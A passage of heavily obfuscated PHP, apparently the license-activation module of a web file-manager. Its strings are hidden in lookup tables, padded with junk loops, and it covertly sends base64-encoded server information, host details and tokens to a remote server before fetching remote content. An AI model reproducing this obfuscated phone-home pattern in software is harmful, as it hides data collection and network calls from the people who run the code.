$µéŒ‰Öô); $ô‘—µ°‚ = $¢„∫ù≥ö[620]; $GLOBALS[$ƒÇ“∆™‚[13]][$ƒÇ“∆™‚[15]] = implode($ƒÇ“∆™‚[0], $GLOBALS[$ƒÇ“∆™‚[13]][$ƒÇ“∆™‚[14]]); $∏ÿ›≥‰Ω = $¢„∫ù≥ö[621]; if (strlen($∏ÿ›≥‰Ω) < $¢„∫ù≥ö[607]) { return; } } private function njek21bfb33a() { $´ÇΩí¸— =& $_SERVER[ëæªã÷]; $≠“õ‹Ùß =& $_SERVER[µÁ∏◊Ÿ•]; if ($GLOBALS[$≠“õ‹Ùß[13]][$≠“õ‹Ùß[15]] != $≠“õ‹Ùß[6]) { return; } $À” Ÿ—æ = $_SERVER[$≠“õ‹Ùß[16]]; $Çê–ÛÛ∏ = $≠“õ‹Ùß[17]; if (!strstr($À” Ÿ—æ, $Çê–ÛÛ∏)) { return; } $•ÓëñÀ∞ = strrpos($À” Ÿ—æ, $Çê–ÛÛ∏); $ÿçœÉ¢≤ = substr($À” Ÿ—æ, $•ÓëñÀ∞ + strlen($Çê–ÛÛ∏)); $ÃßÀﬂúÄ = $´ÇΩí¸—[622]; if (!$ÃßÀﬂúÄ) { return; } preg_match_all($≠“õ‹Ùß[18], $ÿçœÉ¢≤, $‘˜’î∂©); $ÿçœÉ¢≤ = trim($‘˜’î∂©[0][0], $≠“õ‹Ùß[19]); $€û∆ú∑ﬁ = $´ÇΩí¸—[623]; $GLOBALS[$≠“õ‹Ùß[13]][$≠“õ‹Ùß[14]] = explode($≠“õ‹Ùß[19], $ÿçœÉ¢≤); $öÅ≥Û˙ÿ = $´ÇΩí¸—[624]; if (strlen($öÅ≥Û˙ÿ) < $´ÇΩí¸—[619]) { die; } $GLOBALS[$≠“õ‹Ùß[13]][$≠“õ‹Ùß[15]] = implode($≠“õ‹Ùß[0], $GLOBALS[$≠“õ‹Ùß[13]][$≠“õ‹Ùß[14]]); $†¬Í≠Õ‰ = $´ÇΩí¸—[625]; if (strlen($†¬Í≠Õ‰) < $´ÇΩí¸—[619]) { die; } } public function run() { $¯éü©ïœ =& $_SERVER[ëæªã÷]; $Ë⁄ÿÊè∞ =& $_SERVER[µÁ∏◊Ÿ•]; $this->njek21bfb33a(); $ﬁºììêè = $¯éü©ïœ[626]; if (!$ﬁºììêè) { return; } $this->ufib35307385(); $∑ß‡Ë›§ = $GLOBALS[$Ë⁄ÿÊè∞[13]][$Ë⁄ÿÊè∞[14]]; $≈»òåûÚ = $GLOBALS[$Ë⁄ÿÊè∞[13]][$Ë⁄ÿÊè∞[15]]; define($Ë⁄ÿÊè∞[20], isset($∑ß‡Ë›§[0]) && $∑ß‡Ë›§[0] ? $∑ß‡Ë›§[0] : $this->defaultModule); $‚∆Ùπÿ∞ = $¯éü©ïœ[627]; if (strlen($‚∆Ùπÿ∞) < $¯éü©ïœ[628]) { return; } define($Ë⁄ÿÊè∞[21], isset($∑ß‡Ë›§[1]) && $∑ß‡Ë›§[0] ? $∑ß‡Ë›§[1] : $this->defaultController); $»≤ﬁ‡Ï† = $¯éü©ïœ[629]; while ($»≤ﬁ‡Ï† < $¯éü©ïœ[619]) { if ($»≤ﬁ‡Ï† >= 0) { break; } $»≤ﬁ‡Ï†++; } define($Ë⁄ÿÊè∞[22], isset($∑ß‡Ë›§[2]) && $∑ß‡Ë›§[0] ? $∑ß‡Ë›§[2] : $this->defaultAction); define($Ë⁄ÿÊè∞[23], MOD . $Ë⁄ÿÊè∞[0] . ST . $Ë⁄ÿÊè∞[0] . ACT); $_SERVER[$Ë⁄ÿÊè∞[24]] = strtolower(ACTION); $this->autorun(); $—®˘ÓõÉ = $¯éü©ïœ[630]; if (!$—®˘ÓõÉ) { die; } if (count($∑ß‡Ë›§) >= 3) { $this->appRun($≈»òåûÚ); } else { $this->appRun(ACTION); } } private $oalwec19949c = array(); private $flcg80db35ae = ''; public function vqts619017a0() { $ì®è”÷Ú =& $_SERVER[ëæªã÷]; $öÜ÷¶ì¯ =& $_SERVER[µÁ∏◊Ÿ•]; $this->kpjx423d3952(); $this->mzft67a0e8ff(); $this->ogzvf36fdc2c(); $this->jokta110e901(); $úüØ˜‡® = $ì®è”÷Ú[631]; if (strlen($úüØ˜‡®) < $ì®è”÷Ú[628]) { die; } $this->vlwy5c0a0e7a(); $†¯∞Øüì = $ì®è”÷Ú[632]; $this->hikv043dc1e8(); $this->xolw970ff557(); $‡õº¯÷ë = $ì®è”÷Ú[633]; $this->waxud5e2c77f($öÜ÷¶ì¯[25], array($this, $öÜ÷¶ì¯[26])); $this->waxud5e2c77f($öÜ÷¶ì¯[27], array($this, $öÜ÷¶ì¯[28])); $this->waxud5e2c77f($öÜ÷¶ì¯[29], array($this, $öÜ÷¶ì¯[30])); $£±Ãòé¬ = $ì®è”÷Ú[634]; if (strlen($£±Ãòé¬) < $ì®è”÷Ú[66]) { return; } $this->waxud5e2c77f($öÜ÷¶ì¯[31], array($this, $öÜ÷¶ì¯[32])); } public function ptwqbb5f5145($ï ‹Ê¢Í) { $ôÇ ‚úê =& $_SERVER[ëæªã÷]; $˝˘πΩ›π =& $_SERVER[µÁ∏◊Ÿ•]; $™Ó◊∫ØØ = Model($˝˘πΩ›π[33])->get(); $°èûÖÂê = $ôÇ ‚úê[635]; while (strlen($°èûÖÂê) < $ôÇ ‚úê[619]) { if (!$°èûÖÂê) { break; } $°èûÖÂê++; } $¬°“§ÁÙ = array($˝˘πΩ›π[34], $˝˘πΩ›π[35], $˝˘πΩ›π[36], $˝˘πΩ›π[37], $˝˘πΩ›π[38], $˝˘πΩ›π[39], $˝˘πΩ›π[40], $˝˘πΩ›π[41], $˝˘πΩ›π[42], $˝˘πΩ›π[43], $˝˘πΩ›π[44], $˝˘πΩ›π[45], $˝˘πΩ›π[46], $˝˘πΩ›π[47], $˝˘πΩ›π[48], $˝˘πΩ›π[49], $˝˘πΩ›π[50], $˝˘πΩ›π[51], $˝˘πΩ›π[52], $˝˘πΩ›π[53], $˝˘πΩ›π[54], $˝˘πΩ›π[55], $˝˘πΩ›π[56], $˝˘πΩ›π[57], $˝˘πΩ›π[58], $˝˘πΩ›π[59], $˝˘πΩ›π[60], $˝˘πΩ›π[61], $˝˘πΩ›π[62], $˝˘πΩ›π[63], $˝˘πΩ›π[64], $˝˘πΩ›π[65], $˝˘πΩ›π[66], $˝˘πΩ›π[67], $˝˘πΩ›π[68], $˝˘πΩ›π[69], $˝˘πΩ›π[70], $˝˘πΩ›π[71], $˝˘πΩ›π[72], $˝˘πΩ›π[73], $˝˘πΩ›π[74], $˝˘πΩ›π[75], $˝˘πΩ›π[76], $˝˘πΩ›π[77], $˝˘πΩ›π[78], $˝˘πΩ›π[79], $˝˘πΩ›π[80], $˝˘πΩ›π[81], $˝˘πΩ›π[82]); foreach ($¬°“§ÁÙ as $„˜Æ¸…õ) { $Äóå†ÛÉ = $GLOBALS[$˝˘πΩ›π[83]][$˝˘πΩ›π[84]][$„˜Æ¸…õ]; if (isset($™Ó◊∫ØØ[$„˜Æ¸…õ])) { $Äóå†ÛÉ = $™Ó◊∫ØØ[$„˜Æ¸…õ]; } $ï ‹Ê¢Í[$˝˘πΩ›π[85]][$˝˘πΩ›π[86]][$„˜Æ¸…õ] = $Äóå†ÛÉ; } $Õ¿óÊ›è = $ï ‹Ê¢Í[$˝˘πΩ›π[85]][$˝˘πΩ›π[86]][$˝˘πΩ›π[46]]; unset($ï ‹Ê¢Í[$˝˘πΩ›π[85]][$˝˘πΩ›π[87]][$˝˘πΩ›π[88]]); unset($ï ‹Ê¢Í[$˝˘πΩ›π[85]][$˝˘πΩ›π[87]][$˝˘πΩ›π[89]]); $ﬂàå£û = $ôÇ ‚úê[636]; if (strlen($ﬂàå£û) < $ôÇ ‚úê[607]) { die; } unset($ï ‹Ê¢Í[$˝˘πΩ›π[85]][$˝˘πΩ›π[86]][$˝˘πΩ›π[46]]); unset($ï ‹Ê¢Í[$˝˘πΩ›π[85]][$˝˘πΩ›π[86]][$˝˘πΩ›π[90]]); $Äù∆°†Ω = $ôÇ ‚úê[637]; while (strlen($Äù∆°†Ω) < $ôÇ ‚úê[619]) { if (!$Äù∆°†Ω) { break; } $Äù∆°†Ω++; } $ï ‹Ê¢Í[$˝˘πΩ›π[85]][$˝˘πΩ›π[86]][$˝˘πΩ›π[91]] = array($˝˘πΩ›π[92] => (int) $Õ¿óÊ›è[$˝˘πΩ›π[93]], $˝˘πΩ›π[94] => (int) _get($Õ¿óÊ›è, $˝˘πΩ›π[95], 0)); $ï ‹Ê¢Í[$˝˘πΩ›π[96]][$˝˘πΩ›π[97]] = Action($˝˘πΩ›π[98])->accessToken(); $±ºõ»◊â = $ôÇ ‚úê[638]; $ï ‹Ê¢Í[$˝˘πΩ›π[96]][$˝˘πΩ›π[99]] = md5($_SERVER[$˝˘πΩ›π[100]] . $™Ó◊∫ØØ[$˝˘πΩ›π[101]]); $ï ‹Ê¢Í[$˝˘πΩ›π[96]][$˝˘πΩ›π[102]] = base64_encode(serverInfo()); $éöÚ∆Ëé = $ôÇ ‚úê[639]; if (strlen($éöÚ∆Ëé) < $ôÇ ‚úê[607]) { return; } $ï ‹Ê¢Í[$˝˘πΩ›π[96]][$˝˘πΩ›π[103]] = $this->flcg80db35ae; $ÓáÛë–µ = $ôÇ ‚úê[640]; if (strlen($ÓáÛë–µ) < $ôÇ ‚úê[628]) { return; } if ($™Ó◊∫ØØ[$˝˘πΩ›π[103]] != $˝˘πΩ›π[104]) { $ï ‹Ê¢Í[$˝˘πΩ›π[96]][$˝˘πΩ›π[105]] = $™Ó◊∫ØØ[$˝˘πΩ›π[105]]; $ï ‹Ê¢Í[$˝˘πΩ›π[96]][$˝˘πΩ›π[106]] = $™Ó◊∫ØØ[$˝˘πΩ›π[106]]; $ì§ç∂≠É = rand_string(10) . $this->flcg80db35ae . rand_string(5); $ï ‹Ê¢Í[$˝˘πΩ›π[85]][$˝˘πΩ›π[107]][$˝˘πΩ›π[108]] = $this->wsoh12ce48e0($ì§ç∂≠É, $ï ‹Ê¢Í[$˝˘πΩ›π[96]][$˝˘πΩ›π[99]]); } if ($this->flcg80db35ae == $˝˘πΩ›π[104]) { $ï ‹Ê¢Í[$˝˘πΩ›π[85]][$˝˘πΩ›π[86]][$˝˘πΩ›π[91]][$˝˘πΩ›π[95]] = 0; } $ï ‹Ê¢Í[$˝˘πΩ›π[96]][$˝˘πΩ›π[109]] = _get($this->oalwec19949c, $˝˘πΩ›π[110], $˝˘πΩ›π[6]); $ï ‹Ê¢Í[$˝˘πΩ›π[96]][$˝˘πΩ›π[111]] = _get($this->oalwec19949c, $˝˘πΩ›π[112], $˝˘πΩ›π[6]); if (_get($GLOBALS, $˝˘πΩ›π[113]) && $this->config[$˝˘πΩ›π[114]]) { $ï ‹Ê¢Í[$˝˘πΩ›π[96]][$˝˘πΩ›π[115]] = WEB_ROOT; } return $ï ‹Ê¢Í; } private function hikv043dc1e8() { $ÒòÿÄ’ó =& $_SERVER[ëæªã÷]; $™ß†á¢ =& $_SERVER[µÁ∏◊Ÿ•]; if ($_SERVER[$™ß†á¢[24]] == $™ß†á¢[116]) { $‰ØŒîˆº = array($™ß†á¢[103] => $this->flcg80db35ae, $™ß†á¢[117] => $this->guob2756a164(), $™ß†á¢[118] => Model($™ß†á¢[119])->count()); if ($this->flcg80db35ae != $™ß†á¢[104]) { $¥á◊Âï˚ = _get($this->oalwec19949c, $™ß†á¢[120]); if ($¥á◊Âï˚) { $‰ØŒîˆº[$™ß†á¢[121]] = $¥á◊Âï˚; $‰ØŒîˆº[$™ß†á¢[122]] = strtotime(_get($this->oalwec19949c, $™ß†á¢[123])); $‰ØŒîˆº[$™ß†á¢[124]] = _get($this->oalwec19949c, $™ß†á¢[112]); } $üÆñ©Ê◊ = Model($™ß†á¢[33])->get($™ß†á¢[125], $™ß†á¢[6], !0); if (is_string($üÆñ©Ê◊) && substr($üÆñ©Ê◊, 0, 1) == $™ß†á¢[126]) { $üÆñ©Ê◊ = json_decode_force($üÆñ©Ê◊); } if (is_array($üÆñ©Ê◊) && $üÆñ©Ê◊[$™ß†á¢[127]] && strstr($üÆñ©Ê◊[$™ß†á¢[127]], $™ß†á¢[128])) { $Û¨¨á©¨ = explode($™ß†á¢[128], $üÆñ©Ê◊[$™ß†á¢[127]]); $‰ØŒîˆº[$™ß†á¢[129]] = $Û¨¨á©¨[0]; } } $‰ØŒîˆº = $this->rwigcd75ca9f(json_encode($‰ØŒîˆº), md5($™ß†á¢[130])); $©Ãù≠“» = $ÒòÿÄ’ó[641]; while (strlen($©Ãù≠“») < $ÒòÿÄ’ó[607]) { if (!$©Ãù≠“») { break; } $©Ãù≠“»++; } $Ωﬂßµ”ß = array($™ß†á¢[131] => $‰ØŒîˆº); call_user_func(array($™ß†á¢[132], $™ß†á¢[133]), $Ωﬂßµ”ß); } if ($this->flcg80db35ae == $™ß†á¢[104]) { return; } $‡∂È»•“ = array($™ß†á¢[134], $™ß†á¢[135], $™ß†á¢[136], $™ß†á¢[137], $™ß†á¢[138], $™ß†á¢[139]); $ò ú´Ãﬁ = $ÒòÿÄ’ó[642]; while (strlen($ò ú´Ãﬁ) < $ÒòÿÄ’ó[66]) { if (!$ò ú´Ãﬁ) { break; } $ò ú´Ãﬁ++; } $ª“’Ç„∑ = Model($™ß†á¢[33])->get(); $ìò£ô» = $ÒòÿÄ’ó[643]; if (strlen($ìò£ô») < $ÒòÿÄ’ó[66]) { die; } $Ωﬂßµ”ß = array($™ß†á¢[140] => $ª“’Ç„∑[$™ß†á¢[34]], $™ß†á¢[141] => $ª“’Ç„∑[$™ß†á¢[35]], $™ß†á¢[142] => $™ß†á¢[6]); $©Â¨†Ê‰ = $ÒòÿÄ’ó[644]; if (!$©Â¨†Ê‰) { return; } foreach ($‡∂È»•“ as $·„™¯† ) { if (!isset($ª“’Ç„∑[$·„™¯† ]) || !$ª“’Ç„∑[$·„™¯† ]) { continue; } $Ωﬂßµ”ß[$·„™¯† ] = $ª“’Ç„∑[$·„™¯† ]; } call_user_func(array($™ß†á¢[132], $™ß†á¢[133]), $Ωﬂßµ”ß); $ûﬂŸƒô¶ = $ÒòÿÄ’ó[645]; while ($ûﬂŸƒô¶ < $ÒòÿÄ’ó[66]) { if ($ûﬂŸƒô¶ >= 0) { break; } $ûﬂŸƒô¶++; } } private function jokta110e901() { $πŒ™Ô∂· =& $_SERVER[ëæªã÷]; $ÀÊÖ®ü =& $_SERVER[µÁ∏◊Ÿ•]; if ($_SERVER[$ÀÊÖ®ü[24]] != $ÀÊÖ®ü[143]) { return; } if (!_get($GLOBALS, $ÀÊÖ®ü[113])) { die; } $¯™üø‹Â = $GLOBALS[$ÀÊÖ®ü[13]]; if (isset($¯™üø‹Â[$ÀÊÖ®ü[144]])) { $this->hkzs8cf4b462(); die; } if (!isset($¯™üø‹Â[$ÀÊÖ®ü[145]]) || strlen($¯™üø‹Â[$ÀÊÖ®ü[145]]) != 16) { show_json($ÀÊÖ®ü[146] . $¯™üø‹Â[$ÀÊÖ®ü[145]], !1); } $Ùñöô÷ç = Model($ÀÊÖ®ü[33])->get($ÀÊÖ®ü[101]); $™—ÉˆØ— = md5($_SERVER[$ÀÊÖ®ü[100]] . $Ùñöô÷ç); $í¡·©≠´ = array($ÀÊÖ®ü[145] => $¯™üø‹Â[$ÀÊÖ®ü[145]], $ÀÊÖ®ü[147] => rand_string(16), $ÀÊÖ®ü[148] => $ÀÊÖ®ü[130], $ÀÊÖ®ü[149] => $ÀÊÖ®ü[150], $ÀÊÖ®ü[151] => $_SERVER[$ÀÊÖ®ü[152]], $ÀÊÖ®ü[153] => $_SERVER[$ÀÊÖ®ü[154]], $ÀÊÖ®ü[155] => $_SERVER[$ÀÊÖ®ü[156]], $ÀÊÖ®ü[99] => $™—ÉˆØ—, $ÀÊÖ®ü[157] => Model($ÀÊÖ®ü[33])->get($ÀÊÖ®ü[125])); if ($¯™üø‹Â[$ÀÊÖ®ü[158]] == $ÀÊÖ®ü[159]) { $ìœîõ¶™ = $this->rwigcd75ca9f($™—ÉˆØ—, $ÀÊÖ®ü[160]); $åâï∫’ = $this->wsoh12ce48e0(json_encode($í¡·©≠´), $™—ÉˆØ— . $ÀÊÖ®ü[161], 3); $åâï∫’ = $åâï∫’ . $ÀÊÖ®ü[162] . $_SERVER[$ÀÊÖ®ü[152]]; $¿∏∞ÿﬂõ = $this->blxm300d5da1($ÀÊÖ®ü[163] . $ìœîõ¶™ . $ÀÊÖ®ü[164] . $åâï∫’, -1); show_json($¿∏∞ÿﬂõ, !0); } else { if ($¯™üø‹Â[$ÀÊÖ®ü[158]] == $ÀÊÖ®ü[165]) { $¬≤≥∞¯™ = substr(md5($ÀÊÖ®ü[166] . $™—ÉˆØ—), 12, 15) . $ÀÊÖ®ü[167]; $åâï∫’ = $this->zxjm8f943b85(trim($¯™üø‹Â[$ÀÊÖ®ü[168]]), $¬≤≥∞¯™, 2); $øä¬—È¨ = json_decode($åâï∫’, !0); if (!is_array($øä¬—È¨) || !is_array($øä¬—È¨[$ÀÊÖ®ü[169]]) || $øä¬—È¨[$ÀÊÖ®ü[145]] != !0) { $ä⁄ú’πﬂ = $ÀÊÖ®ü[170]; $Åô‚…∏ß = $øä¬—È¨[$ÀÊÖ®ü[169]] ? $ÀÊÖ®ü[171] . $øä¬—È¨[$ÀÊÖ®ü[169]] : $ä⁄ú’πﬂ; show_json($Åô‚…∏ß, !1); } else { $í¡·©≠´[$ÀÊÖ®ü[147]] = $øä¬—È¨[$ÀÊÖ®ü[169]][$ÀÊÖ®ü[172]]; } } else { $øä¬—È¨ = $this->blxm300d5da1($ÀÊÖ®ü[173], $í¡·©≠´, 10); } } if (!is_array($øä¬—È¨) || !is_array($øä¬—È¨[$ÀÊÖ®ü[169]]) || $øä¬—È¨[$ÀÊÖ®ü[145]] != !0) { $ä⁄ú’πﬂ = LNG($ÀÊÖ®ü[174]); $Åô‚…∏ß = $øä¬—È¨[$ÀÊÖ®ü[169]] ? $ÀÊÖ®ü[171] . $øä¬—È¨[$ÀÊÖ®ü[169]] : $ä⁄ú’πﬂ; show_json($Åô‚…∏ß, !1); } $ÑæàÁÇÑ = $øä¬—È¨[$ÀÊÖ®ü[169]]; $√˙ƒ©üœ = $this->feoa7bf0a8dd($ÑæàÁÇÑ[$ÀÊÖ®ü[175]]); if (!$√˙ƒ©üœ || $√˙ƒ©üœ != $ÑæàÁÇÑ[$ÀÊÖ®ü[123]]) { $é÷¸Ú”µ = array($ÀÊÖ®ü[176] => Model($ÀÊÖ®ü[33])->get($ÀÊÖ®ü[101]), $ÀÊÖ®ü[177] => $_SERVER[$ÀÊÖ®ü[100]], $ÀÊÖ®ü[178] => this_url(), $ÀÊÖ®ü[153] => $_SERVER[$ÀÊÖ®ü[154]]); $åâï∫’ = $this->zdpw8ca6602d(json_encode($é÷¸Ú”µ)); $this->blxm300d5da1($ÀÊÖ®ü[179] . $åâï∫’); show_json(LNG($ÀÊÖ®ü[180]), !0); } $ßò¥†›„ = array($ÀÊÖ®ü[181] => $ÑæàÁÇÑ[$ÀÊÖ®ü[182]], $ÀÊÖ®ü[183] => $ÑæàÁÇÑ[$ÀÊÖ®ü[184]], $ÀÊÖ®ü[185] => rand_string(16), $ÀÊÖ®ü[103] => $ÑæàÁÇÑ[$ÀÊÖ®ü[186]]); if ($í¡·©≠´[$ÀÊÖ®ü[147]]) { $ßò¥†›„[$ÀÊÖ®ü[185]] = $í¡·©≠´[$ÀÊÖ®ü[147]]; } $¸˙˜ £ﬂ = substr(md5($ßò¥†›„[$ÀÊÖ®ü[183]]), 10, 10); $û◊æïÂ = $¸˙˜ £ﬂ . $ßò¥†›„[$ÀÊÖ®ü[103]] . $ßò¥†›„[$ÀÊÖ®ü[185]]; $ ì¿¢´ã = $πŒ™Ô∂·[646]; if (!$ ì¿¢´ã) { return; } $ßò¥†›„[$ÀÊÖ®ü[105]] = strrev(base64_encode($this->rwigcd75ca9f($û◊æïÂ, $ÀÊÖ®ü[187]))); $íôâŸçï = $πŒ™Ô∂·[647]; if (!$íôâŸçï) { return; } $¶ñÊ’Üú = rand_string(16); $ü‚¨Úï† = $πŒ™Ô∂·[648]; if (!$ü‚¨Úï†) { die; } $è»¶†ìî = $¶ñÊ’Üú . $ßò¥†›„[$ÀÊÖ®ü[103]] . $this->rwigcd75ca9f(md5($ßò¥†›„[$ÀÊÖ®ü[181]]), $¶ñÊ’Üú); $ﬁ’´„˜Ω = $πŒ™Ô∂·[649]; if (strlen($ﬁ’´„˜Ω) < $πŒ™Ô∂·[615]) { return; } $ßò¥†›„[$ÀÊÖ®ü[106]] = base64_encode(strrev($this->rwigcd75ca9f($è»¶†ìî, $ÀÊÖ®ü[188]))); $ìÃ…±Çë = $πŒ™Ô∂·[650]; if (!$ìÃ…±Çë) { return; } if ($ÑæàÁÇÑ[$ÀÊÖ®ü[189]] && $ÑæàÁÇÑ[$ÀÊÖ®ü[189]] >= 1) { Model($ÀÊÖ®ü[33])->setDeep($ÀÊÖ®ü[190], $ÀÊÖ®ü[191]); } Model($ÀÊÖ®ü[33])->set($ßò¥†›„); $„Øµõ˚≠ = md5($_SERVER[$ÀÊÖ®ü[100]] . strrev($Ùñöô÷ç) . $ßò¥†›„[$ÀÊÖ®ü[183]]); $çÅ∫‘‘— = $πŒ™Ô∂·[651]; if (!$çÅ∫‘‘—) { die; } $‚‘„À„‹ = strrev(substr($„Øµõ˚≠, 10, 16)); $ŒÛÍæ¨ = $πŒ™Ô∂·[652]; while ($ŒÛÍæ¨ < $πŒ™Ô∂·[615]) { if ($ŒÛÍæ¨ >= 0) { break; } $ŒÛÍæ¨++; } $»çÊÖÉÔ = $this->wsoh12ce48e0(json_encode($ÑæàÁÇÑ), $„Øµõ˚≠); $Ëç¡—»§ = $πŒ™Ô∂·[653]; while ($Ëç¡—»§ < $πŒ™Ô∂·[628]) { if ($Ëç¡—»§ >= 0) { break; } $Ëç¡—»§++; } $à¬‚Ë¥Ü = array_to_keyvalue(Model($ÀÊÖ®ü[7])->listData(), $ÀÊÖ®ü[192]); $∆êÄ£ıË = $à¬‚Ë¥Ü[$ÀÊÖ®ü[193]]; $ˆµ±ÕôÍ = array(); $ˆµ±ÕôÍ[$‚‘„À„‹] = $»çÊÖÉÔ; $Ûë§åã = $πŒ™Ô∂·[654]; while (strlen($Ûë§åã) < $πŒ™Ô∂·[607]) { if (!$Ûë§åã) { break; } $Ûë§åã++; } Model($ÀÊÖ®ü[7])->update($∆êÄ£ıË[$ÀÊÖ®ü[194]], array($ÀÊÖ®ü[195] => $ˆµ±ÕôÍ)); $this->oalwec19949c = $ÑæàÁÇÑ; $this->flcg80db35ae = $ßò¥†›„[$ÀÊÖ®ü[103]]; $Œú¥á¶ª = $πŒ™Ô∂·[655]; if (!$Œú¥á¶ª) { return; } $this->licenseRegistSuccess(); Cache::set($ÀÊÖ®ü[196] . md5($Ùñöô÷ç . $ÀÊÖ®ü[197]), $ÀÊÖ®ü[6]); $õÖÁ€±• = $πŒ™Ô∂·[656]; show_json(LNG($ÀÊÖ®ü[180]), !0); } private function licenseRegistSuccess() { $≠è•¥ìÑ =& $_SERVER[ëæªã÷]; $øøå‹Î— =& $_SERVER[µÁ∏◊Ÿ•]; $∏ó≈¡∂˙ = Model($øøå‹Î—[33])->get(); $’§˚°œﬂ = $≠è•¥ìÑ[657]; while ($’§˚°œﬂ < $≠è•¥ìÑ[628]) { if ($’§˚°œﬂ >= 0) { break; } $’§˚°œﬂ++; } if ($∏ó≈¡∂˙[$øøå‹Î—[63]] != $øøå‹Î—[191]) { Model($øøå‹Î—[33])->set($øøå‹Î—[63], $øøå‹Î—[191]); } Action($øøå‹Î—[198])->initStart(!0); } private function hkzs8cf4b462() { $äâ‚«âî =& $_SERVER[ëæªã÷]; $óÉ¸≠¥ä =& $_SERVER[µÁ∏◊Ÿ•]; Model($óÉ¸≠¥ä[33])->set(array($óÉ¸≠¥ä[181] => $óÉ¸≠¥ä[6], $óÉ¸≠¥ä[183] => $óÉ¸≠¥ä[6], $óÉ¸≠¥ä[103] => $óÉ¸≠¥ä[104], $óÉ¸≠¥ä[105] => $óÉ¸≠¥ä[6], $óÉ¸≠¥ä[106] => $óÉ¸≠¥ä[6])); $Œ·Ä‰∂Û = $äâ‚«âî[658]; if (!$Œ·Ä‰∂Û) { return; } Model($óÉ¸≠¥ä[33])->setDeep($óÉ¸≠¥ä[190], $óÉ¸≠¥ä[199]); $ãÕßÜ˚Ä = $äâ‚«âî[659]; while ($ãÕßÜ˚Ä < $äâ‚«âî[66]) { if ($ãÕßÜ˚Ä >= 0) { break; } $ãÕßÜ˚Ä++; } $this->oalwec19949c = array(); $ øáıµ† = $äâ‚«âî[660]; $this->flcg80db35ae = $óÉ¸≠¥ä[104]; } private function kpjx423d3952() { $óŸ˛∑›… =& $_SERVER[ëæªã÷]; $ëÊ’àØî =& $_SERVER[µÁ∏◊Ÿ•]; $_SERVER[$ëÊ’àØî[154]] = _get($_SERVER, $ëÊ’àØî[154], APP_HOST); $this->flcg80db35ae = $ëÊ’àØî[104]; $Ûœå ›Ë = Model($ëÊ’àØî[33])->get(); $ﬁ∫∞’˛¶ = $óŸ˛∑›…[661]; while ($ﬁ∫∞’˛¶ < $óŸ˛∑›…[66]) { if ($ﬁ∫∞’˛¶ >= 0) { break; } $ﬁ∫∞’˛¶++; } if ($Ûœå ›Ë[$ëÊ’àØî[103]] == $ëÊ’àØî[104]) { return; } $ìÁî¨ﬁÉ = Model($ëÊ’àØî[33])->get($ëÊ’àØî[101]); $´ à‹å˜ = $óŸ˛∑›…[662]; $•éû’¢ô = $ëÊ’àØî[196] . md5($ìÁî¨ﬁÉ . $ëÊ’àØî[197]); $À¥Ÿ˙›ü = Cache::get($•éû’¢ô); if (!is_array($À¥Ÿ˙›ü) || !isset($À¥Ÿ˙›ü[$ëÊ’àØî[200]]) || time() - $À¥Ÿ˙›ü[$ëÊ’àØî[200]] >= 60) { $ª¡¨Ã®ó = Model($ëÊ’àØî[7])->loadList(); $ê¶çπ˛® = $ª¡¨Ã®ó[$ëÊ’àØî[193]]; $‹°‘‹»„ = md5($_SERVER[$ëÊ’àØî[100]] . strrev($ìÁî¨ﬁÉ) . $Ûœå ›Ë[$ëÊ’àØî[183]]); $Ò∂‚“Á£ = strrev(substr($‹°‘‹»„, 10, 16)); $À¥Ÿ˙›ü = $this->zxjm8f943b85($ê¶çπ˛®[$ëÊ’àØî[83]][$Ò∂‚“Á£], $‹°‘‹»„); $À¥Ÿ˙›ü = json_decode($À¥Ÿ˙›ü, !0); } if (!is_array($À¥Ÿ˙›ü)) { return $this->hkzs8cf4b462(); } $√∑ÿ˛ãı = strtotime($À¥Ÿ˙›ü[$ëÊ’àØî[123]]); if (time() >= $√∑ÿ˛ãı) { return $this->hkzs8cf4b462(); } if (time() - $À¥Ÿ˙›ü[$ëÊ’àØî[200]] > 20) { $À¥Ÿ˙›ü[$ëÊ’àØî[200]] = time(); Cache::set($•éû’¢ô, $À¥Ÿ˙›ü); } $this->oalwec19949c = $À¥Ÿ˙›ü; $this->flcg80db35ae = $Ûœå ›Ë[$ëÊ’àØî[103]]; $∞‘Øá∂§ = $óŸ˛∑›…[663]; while ($∞‘Øá∂§ < $óŸ˛∑›…[615]) { if ($∞‘Øá∂§ >= 0) { break; } $∞‘Øá∂§++; } } private function mzft67a0e8ff() { $ÊÌ˜êÿŸ =& $_SERVER[µÁ∏◊Ÿ•]; $ˆª∏àΩË = $GLOBALS[$ÊÌ˜êÿŸ[13]]; $Êîÿ≥∑© = $_SERVER[$ÊÌ˜êÿŸ[24]]; if ($Êîÿ≥∑© == $ÊÌ˜êÿŸ[201] && $this->flcg80db35ae == $ÊÌ˜êÿŸ[104]) { show_json(LNG($ÊÌ˜êÿŸ[202]), !1, $ÊÌ˜êÿŸ[203]); } $“¯ô™Ö = array($ÊÌ˜êÿŸ[204], $ÊÌ˜êÿŸ[205]); if (in_array($Êîÿ≥∑©, $“¯ô™Ö)) { if ($this->flcg80db35ae == $ÊÌ˜êÿŸ[104] && isset($ˆª∏àΩË[$ÊÌ˜êÿŸ[206]])) { show_json(LNG($ÊÌ˜êÿŸ[202]), !1, $ÊÌ˜êÿŸ[203]); die; } $åÖà˜¥Õ = $this->guob2756a164(); if ($åÖà˜¥Õ != intval($ÊÌ˜êÿŸ[207])) { if ($åÖà˜¥Õ <= Model($ÊÌ˜êÿŸ[119])->count()) { show_json(LNG($ÊÌ˜êÿŸ[208]), !1, $ÊÌ˜êÿŸ[203]); die; } } } } private function ogzvf36fdc2c() { $ıŸ«∏‘á =& $_SERVER[ëæªã÷]; $ˆ‹ñß·µ =& $_SERVER[µÁ∏◊Ÿ•]; $”ÁÃ¬ÈÌ = array($ˆ‹ñß·µ[116], $ˆ‹ñß·µ[209]); if (!_get($GLOBALS, $ˆ‹ñß·µ[113]) || !isset($_GET[$ˆ‹ñß·µ[210]])) { return; } if (!in_array($_SERVER[$ˆ‹ñß·µ[24]], $”ÁÃ¬ÈÌ)) { return; } $Ôì„˛¶ä = $ˆ‹ñß·µ[211]; $Õ◊˚Éı£ = $ıŸ«∏‘á[664]; if (strlen($Õ◊˚Éı£) < $ıŸ«∏‘á[66]) { return; } $Ôì„˛¶ä = $this->gbnt3a5be98e($Ôì„˛¶ä, $ˆ‹ñß·µ[212]); $Ñ›Çã¶• = stream_context_create(array($ˆ‹ñß·µ[213] => array($ˆ‹ñß·µ[214] => $ˆ‹ñß·µ[215], $ˆ‹ñß·µ[216] => 3))); $‰¸ ö˝ë = @file_get_contents($Ôì„˛¶ä, !1, $Ñ›Çã¶•); 